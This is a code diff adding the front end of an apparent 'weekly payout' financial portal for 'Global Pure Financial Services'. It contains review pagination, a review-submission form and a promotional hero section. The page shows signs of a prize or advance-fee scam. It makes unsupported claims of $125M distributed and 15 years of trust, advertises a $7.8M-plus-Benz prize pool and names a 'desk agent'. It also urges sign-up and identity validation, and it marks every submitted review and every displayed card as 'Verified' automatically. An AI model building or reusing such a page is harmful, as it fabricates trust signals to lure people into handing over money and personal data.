+  add(1); add(cur-2); add(cur-1); add(cur); add(cur+1); add(cur+2); add(totalPages);
+  list.sort((a,b)=>a-b);
+  let html = ''; let prev = 0;
+  for (const p of list) {
+    if (prev && p - prev > 1) html += `<span class="px-1.5 text-slate-500 select-none">…</span>`;
+    if (p === cur) html += `<button onclick="goToReviewsPage(${p})" class="w-9 h-9 rounded-xl text-xs font-extrabold bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 shadow-lg shadow-gold-500/30 active:scale-95 transition">${p}</button>`;
+    else html += `<button onclick="goToReviewsPage(${p})" class="w-9 h-9 rounded-xl text-xs font-bold bg-navy-950 border border-navy-700 text-slate-300 hover:border-sky-custom hover:text-white active:scale-95 transition">${p}</button>`;
+    prev = p;
+  }
+  return html;
+}
+function renderReviewsListHtml() {
+  const filtered = getFilteredReviews();
+  const totalPages = Math.max(1, Math.ceil(filtered.length / state.reviewsPerPage));
+  if (state.reviewsPage > totalPages) state.reviewsPage = totalPages;
+  if (state.reviewsPage < 1) state.reviewsPage = 1;
+  const start = (state.reviewsPage - 1) * state.reviewsPerPage;
+  const pageItems = filtered.slice(start, start + state.reviewsPerPage);
+  const cardsHtml = pageItems.length === 0 ? `<div class="col-span-full py-16 text-center text-slate-400 text-sm bg-navy-900 border border-navy-700/60 rounded-3xl"><i class="fa-solid fa-magnifying-glass text-2xl text-slate-500 mb-3 block"></i>No matching reviews found.</div>` : pageItems.map(r => {
+    const initials = r.name.split(' ').map(n=>n.charAt(0)).slice(0,2).join('');
+    return `<article class="review-card tilt-3d group fade-up"><div class="review-shine"></div><div class="relative z-10 flex flex-col h-full flex-grow"><div class="flex items-start justify-between gap-3 mb-4"><div class="flex items-center gap-3 min-w-0"><div class="review-avatar">${initials}</div><div class="min-w-0"><h4 class="font-bold text-white text-sm truncate flex items-center gap-1.5"><span class="truncate">${escapeHtml(r.name)}</span>${r.verified ? '<i class="fa-solid fa-circle-check text-sky-custom text-[11px] shrink-0"></i>' : ''}</h4><p class="text-[11px] text-slate-400 truncate"><i class="fa-solid fa-location-dot mr-1 text-gold-400/70"></i>${escapeHtml(r.location)}</p></div></div></div><div class="flex items-center justify-between mb-3"><div class="star-row flex text-gold-400 text-xs gap-0.5">${renderStars(r.rating)}</div><span class="review-badge"><i class="fa-solid fa-star text-[9px]"></i>${r.rating}.0</span></div><p class="review-quote flex-grow">"${escapeHtml(r.comment)}"</p><div class="mt-4 pt-4 border-t border-navy-700/60 flex items-center justify-between text-[11px] text-slate-400"><span><i class="fa-regular fa-calendar-days mr-1"></i>${escapeHtml(r.date)}</span><span class="text-emerald-400 font-bold"><i class="fa-solid fa-shield-halved mr-1"></i>Verified</span></div></div></article>`;
+  }).join('');
+  return `<div class="reviews-grid grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5 sm:gap-6 mb-8">${cardsHtml}</div><div class="flex flex-col lg:flex-row items-center justify-between bg-navy-900 border border-navy-700 px-5 sm:px-6 py-4 rounded-2xl gap-4"><span class="text-xs text-slate-400 text-center lg:text-left">Showing <span class="text-white font-bold">${filtered.length === 0 ? 0 : start + 1}–${Math.min(start + state.reviewsPerPage, filtered.length)}</span> of <span class="text-white font-bold">${filtered.length.toLocaleString()}</span> reviews · Page <span class="text-gold-400 font-bold">${state.reviewsPage}</span> of <span class="text-white font-bold">${totalPages.toLocaleString()}</span></span><div class="flex items-center flex-wrap justify-center gap-2"><button onclick="goToReviewsPage(${state.reviewsPage - 1})" ${state.reviewsPage <= 1 ? 'disabled' : ''} class="px-3.5 py-2 bg-navy-950 border border-navy-700 text-white rounded-xl text-xs font-bold disabled:opacity-30 hover:border-sky-custom active:scale-95 transition"><i class="fa-solid fa-chevron-left"></i></button><div class="hidden sm:flex items-center gap-1.5">${renderPaginationHtml(totalPages)}</div><button onclick="goToReviewsPage(${state.reviewsPage + 1})" ${state.reviewsPage >= totalPages ? 'disabled' : ''} class="px-3.5 py-2 bg-navy-950 border border-navy-700 text-white rounded-xl text-xs font-bold disabled:opacity-30 hover:border-sky-custom active:scale-95 transition"><i class="fa-solid fa-chevron-right"></i></button></div></div>`;
+}
+function attachReviewTilt() {
+  document.querySelectorAll('.tilt-3d').forEach(card => {
+    card.addEventListener('mousemove', (e)=>{ const rect = card.getBoundingClientRect(); const px = (e.clientX - rect.left) / rect.width; const py = (e.clientY - rect.top) / rect.height; const rotY = (px - 0.5)*11; const rotX = (0.5 - py)*11; card.style.transform = `perspective(1000px) rotateY(${rotY}deg) rotateX(${rotX}deg) translateY(-7px) scale(1.025)`; card.style.setProperty('--mx', `${px*100}%`); card.style.setProperty('--my', `${py*100}%`); });
+    card.addEventListener('mouseleave', ()=>{ card.style.transform = ''; card.style.setProperty('--mx', '50%'); card.style.setProperty('--my', '0%'); });
+  });
+}
+function refreshReviewsList() { const wrap = document.getElementById('reviews-list-wrap'); if (!wrap) return; wrap.innerHTML = renderReviewsListHtml(); attachReviewTilt(); }
+function goToReviewsPage(page) { const filtered = getFilteredReviews(); const totalPages = Math.max(1, Math.ceil(filtered.length / state.reviewsPerPage)); state.reviewsPage = Math.min(Math.max(1, page), totalPages); refreshReviewsList(); const section = document.getElementById('reviews-anchor'); if (section) section.scrollIntoView({ behavior:'smooth', block:'start' }); }
+function openAddReviewModal() {
+  const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content');
+  content.innerHTML = `<h3 class="text-lg font-bold text-white mb-4 flex items-center"><i class="fa-solid fa-pen-to-square text-gold-400 mr-2"></i> Submit Review</h3><form onsubmit="submitNewReview(event)" class="space-y-4"><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Your Full Name</label><input type="text" id="new-rev-name" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Robert Smith"></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Location / City</label><input type="text" id="new-rev-loc" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Miami, FL"></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Rating</label><select id="new-rev-rating" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"><option value="5">5 Stars</option><option value="4">4 Stars</option></select></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Comment / Feedback</label><textarea id="new-rev-comment" required rows="3" class="w-full bg-navy-950 border border-navy-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Share your experience..."></textarea></div><div class="flex justify-end space-x-3 pt-2"><button type="button" onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-xs sm:text-sm font-bold">Cancel</button><button type="submit" class="px-6 py-2.5 bg-gold-500 text-navy-950 rounded-xl text-xs sm:text-sm font-bold active:scale-95 transition">Submit Review</button></div></form>`;
+  modal.style.display = 'flex';
+}
+function submitNewReview(e) { e.preventDefault(); state.reviews.unshift({ id:Date.now(), name:document.getElementById('new-rev-name').value, location:document.getElementById('new-rev-loc').value, rating:parseInt(document.getElementById('new-rev-rating').value), date:new Date().toISOString().split('T')[0], comment:document.getElementById('new-rev-comment').value, sample:true, verified:true }); saveDeviceState(); state.reviewsPage = 1; state.reviewsFilterRating = 'all'; state.reviewsSearchQuery = ''; closeModal(); showToast('Review Submitted', 'Thank you for sharing.', 'success'); render(); }
+
+/* ═══════════ HOME VIEW ═══════════ */
+function renderHomeView() {
+  const totalReviews = state.reviews.length;
+  const avgRating = (state.reviews.reduce((s,r)=>s+r.rating,0) / totalReviews).toFixed(1);
+  const fiveStarShare = Math.round((state.reviews.filter(r=>r.rating===5).length / totalReviews) * 100);
+  return `
+  <section class="relative overflow-hidden py-12 sm:py-20 lg:py-24 bg-gradient-to-b from-navy-950 via-navy-900/60 to-navy-950 border-b border-navy-700/50">
+    <div class="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(56,189,248,0.12),transparent_50%)] pointer-events-none"></div>
+    <div class="absolute inset-0 bg-[radial-gradient(circle_at_bottom_left,rgba(245,158,11,0.08),transparent_55%)] pointer-events-none"></div>
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+      <div class="space-y-5 text-center lg:text-left">
+        <div class="inline-flex items-center space-x-2 bg-sky-custom/10 border border-sky-custom/30 px-3.5 py-1.5 rounded-full text-sky-custom text-xs font-bold tracking-wider uppercase backdrop-blur-sm"><i class="fa-solid fa-shield-halved mr-1"></i> Verified Distribution Framework</div>
+        <h1 class="text-3xl sm:text-5xl lg:text-6xl font-extrabold text-white tracking-tight leading-tight">Weekly Payout & <span class="text-transparent bg-clip-text bg-gradient-to-r from-gold-400 via-gold-500 to-gold-600">Financial Portal</span></h1>
+        <p class="text-sm sm:text-lg text-slate-300 leading-relaxed max-w-2xl mx-auto lg:mx-0">Access your scheduled weekly allocations securely. Complete identity validation, manage fund setups, and track Friday distribution disbursements in real time.</p>
+        <div class="flex flex-col sm:flex-row justify-center lg:justify-start gap-3.5 pt-2">
+          <a href="signup.html" class="btn-3d btn-primary w-full sm:w-auto px-8 py-4 bg-gradient-to-br from-gold-400 via-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-2xl transition text-base text-center"><i class="fa-solid fa-arrow-right mr-2"></i> Access Portal Now</a>
+          <a href="login.html" class="btn-3d btn-secondary w-full sm:w-auto px-8 py-4 bg-navy-800 border border-navy-700 text-white font-bold rounded-2xl transition text-base text-center"><i class="fa-solid fa-right-to-bracket mr-2"></i> Sign In</a>
+        </div>
+        <div class="grid grid-cols-3 gap-3 pt-6 max-w-md mx-auto lg:mx-0">
+          <div class="hero-stat text-center">
+            <p class="text-2xl font-black text-gold-400">$125M+</p>
+            <p class="text-[9px] text-slate-400 uppercase font-bold tracking-wider mt-1">Distributed</p>
+          </div>
+          <div class="hero-stat text-center">
+            <p class="text-2xl font-black text-white">45K+</p>
+            <p class="text-[9px] text-slate-400 uppercase font-bold tracking-wider mt-1">Participants</p>
+          </div>
+          <div class="hero-stat text-center">
+            <p class="text-2xl font-black text-sky-custom">15yr</p>
+            <p class="text-[9px] text-slate-400 uppercase font-bold tracking-wider mt-1">Trusted</p>
+          </div>
+        </div>
+      </div>
+      <div class="relative">
+        <div class="absolute inset-0 bg-gradient-to-br from-gold-500/20 via-transparent to-sky-custom/20 blur-3xl rounded-full pointer-events-none"></div>
+        <div class="card-3d bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 shadow-2xl relative z-10 glow-effect space-y-6">
+          <div class="flex items-center justify-between pb-4 border-b border-navy-700">
+            <div class="flex items-center space-x-3">
+              <div class="w-10 h-10 rounded-full bg-gold-500/20 text-gold-400 flex items-center justify-center font-bold shadow-md"><i class="fa-solid fa-award"></i></div>
+              <div><h4 class="font-bold text-white text-sm">Over 15 Years of Excellence</h4><p class="text-xs text-slate-400">Trusted Global Distribution Network</p></div>
+            </div>
+            <span class="px-3 py-1 bg-gold-500/20 text-gold-400 text-xs font-bold rounded-full border border-gold-500/30"><i class="fa-solid fa-trophy mr-1"></i>Promo Live</span>
+          </div>
+          <p class="text-slate-300 text-xs sm:text-sm leading-relaxed">Since <span class="text-white font-bold">2011</span>, Global Pure Financial Services has safely distributed over <span class="text-gold-400 font-bold">$125 Million+</span> in direct rewards and weekly allocations to thousands of verified participants.</p>
+          <div class="bg-gradient-to-br from-gold-500/15 to-navy-900 border border-gold-500/30 p-5 rounded-2xl space-y-3 shadow-lg shadow-gold-500/10">
+            <div class="flex items-center justify-between">
+              <div><h5 class="text-xs font-bold text-gold-400 uppercase tracking-wider"><i class="fa-solid fa-bolt mr-1"></i>Current Prize Pool</h5><p class="text-[11px] text-slate-400 mt-0.5">Live cycle: $7.8M + Benz + $800K + $25K</p></div>
+              <i class="fa-solid fa-gift text-xl text-gold-400 crown-float"></i>
+            </div>
+            <button onclick="document.getElementById('promo-section').scrollIntoView({behavior:'smooth'})" class="btn-3d w-full py-3 bg-gradient-to-br from-gold-400 via-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs transition shadow-lg shadow-gold-500/25"><i class="fa-solid fa-arrow-down mr-1.5"></i> View Promo Details & Enter</button>
+          </div>
+          <div class="grid grid-cols-2 gap-3 text-center">
+            <div class="bg-navy-900/60 p-2.5 rounded-xl border border-navy-700/50"><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Participants</p><p class="text-sm font-black text-white">45,000+</p></div>
+            <div class="bg-navy-900/60 p-2.5 rounded-xl border border-navy-700/50"><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Desk Agent</p><p class="text-xs font-bold text-sky-custom"><i class="fa-solid fa-user-tie mr-1"></i> Andy Goldberg</p></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+  ${renderPromoSection()}
+  <section id="reviews-anchor" class="py-16 sm:py-20 bg-navy-950 border-t border-navy-700/50">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex flex-col md:flex-row md:items-end justify-between mb-8 sm:mb-12 gap-6">
+        <div>
+          <span class="text-xs font-bold text-gold-400 uppercase tracking-widest block mb-2">Participant Feedback</span>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Client Experience Reviews <span class="ml-2 align-middle text-xs sm:text-sm font-bold text-sky-custom bg-sky-custom/10 border border-sky-custom/30 px-3 py-1 rounded-full">${totalReviews.toLocaleString()} Total</span></h2>
+          <p class="text-slate-400 text-xs mt-1.5">Verified feedback collected from participants across the global distribution network.</p>
+        </div>
+        <button onclick="openAddReviewModal()" class="btn-3d btn-secondary w-full sm:w-auto px-5 py-3 bg-sky-custom text-navy-950 font-bold rounded-xl text-sm transition flex items-center justify-center"><i class="fa-solid fa-pen-to-square mr-2"></i> Submit Your Review</button>
+      </div>
+      <div class="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 mb-8">
+        <div class="bg-navy-900 border border-navy-700 rounded-2xl p-4 card-3d"><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Average Rating</p><div class="flex items-center gap-2 mt-1.5"><span class="text-xl sm:text-2xl font-black text-gold-400">${avgRating}</span><span class="text-gold-400 text-xs"><i class="fa-solid fa-star"></i></span></div></div>
+        <div class="bg-navy-900 border border-navy-700 rounded-2xl p-4 card-3d"><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Total Reviews</p><span class="text-xl sm:text-2xl font-black text-white mt-1.5 block">${totalReviews.toLocaleString()}</span></div>
+        <div class="bg-navy-900 border border-navy-700 rounded-2xl p-4 card-3d"><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">5-Star Share</p><span class="text-xl sm:text-2xl font-black text-emerald-400 mt-1.5 block">${fiveStarShare}%</span></div>
+        <div class="bg-navy-900 border border-navy-700 rounded-2xl p-4 card-3d"><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Verified Payouts</p><span class="text-xl sm:text-2xl font-black text-sky-custom mt-1.5 block">100%</span></div>
+      </div>
+      <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl mb-8 flex flex-col sm:flex-row gap-4 items-center justify-between">
+        <div class="relative w-full sm:w-96"><i class="fa-solid fa-magnifying-glass absolute left-4 top-3.5 text-slate-400"></i><input type="text" id="review-search-input" value="${escapeHtml(state.reviewsSearchQuery)}" placeholder="Search reviews by name, comment, city..." class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom transition-colors"></div>
+        <div class="flex items-center space-x-3 w-full sm:w-auto justify-end">
+          <label class="text-xs text-slate-400 font-semibold">Filter:</label>
+          <select id="review-rating-filter" class="bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom transition-colors">
+            <option value="all" ${state.reviewsFilterRating==='all'?'selected':''}>All Ratings</option>
+            <option value="5" ${state.reviewsFilterRating==='5'?'selected':''}>5 Stars</option>
+            <option value="4" ${state.reviewsFilterRating==='4'?'selected':''}>4 Stars</option>
+          </select>
+        </div>
+      </div>
+      <div id="reviews-list-wrap">${renderReviewsListHtml()}</div>
+    </div>
+  </section>`;
+}
+
+function initHomeEvents() {
+  const searchInput = document.getElementById('review-search-input');
+  if (searchInput) searchInput.addEventListener('input', (e)=>{ state.reviewsSearchQuery = e.target.value; state.reviewsPage = 1; refreshReviewsList(); });
+  const ratingFilter = document.getElementById('review-rating-filter');
+  if (ratingFilter) ratingFilter.addEventListener('change', (e)=>{ state.reviewsFilterRating = e.target.value; state.reviewsPage = 1; refreshReviewsList(); });
+  attachReviewTilt();
+  initPromoCountdown();
+}
+
+/* ═══════════ RENDER DISPATCH ═══════════ */
+function render() {
+  renderHeaderNav();
+  const container = document.getElementById('app-container');
+  container.innerHTML = renderHomeView();
+  initHomeEvents();
+}
+
+window.addEventListener('load', async () => {
+  ensurePromoState();
+  render();
+  setTimeout(()=>{ try { showToast('Portal Online', 'Secure distribution session initialized.', 'info'); } catch(e){} }, 1000);
+  window.addEventListener('beforeunload', () => { if (promoInterval) clearInterval(promoInterval); });
+});
+</script>
+</body>
+</html>
